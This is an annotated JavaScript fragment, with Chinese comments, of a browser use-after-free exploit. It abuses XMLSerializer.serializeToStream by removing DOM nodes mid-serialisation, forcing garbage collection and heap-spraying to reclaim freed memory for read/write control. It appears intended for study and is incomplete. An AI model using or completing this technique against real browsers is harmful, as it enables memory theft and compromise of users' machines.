//2019, 12/22, PM12:00, by Queenie
// heap dump 記憶體洩漏
// 駭客將 heap 從 serialize 轉為 stream 從 web 回傳
// 並操作此區塊地區，進行讀寫控制

var s = new XMLSerializer();
num_child = 64; // 觸發 use after free 漏洞的 DOM 數量
small_spray_num = 1 << 21;
GC_TRIGGER_THRESGHOLD = 100000;

// 觸發 GC
// 經過 GC 後，重新動態配置記憶體
// 駭客此階段，目標鎖定一個 HTMLElement 實例

function triggerGC() {
    var gc = [];

    for(i = 0; i < GC_TRIGGER_THRESGHOLD; i++){
        gc[i] = new Array();
    }

    return gc;
}


// 駭客藉由移除 DOM 先觸發GC，產生『堆積洞孔』
var stream = 
{
    write: function()
    {

        for(i = 0; i < num_child; i++)
        {
            parent.removeChild(children[i]);
            delete children[i];
            children[i] = null;
        }

        triggerGC();

        // 控制堆積洞孔
        // 此處 buffer 仍然持有資料！！！
        for(i = 0; i < small_spray_num; i += 2)
            container_2[i] = buf.toLowerCase();

    }

};

s.serializeToStream(parent, stream, "UTF-8");

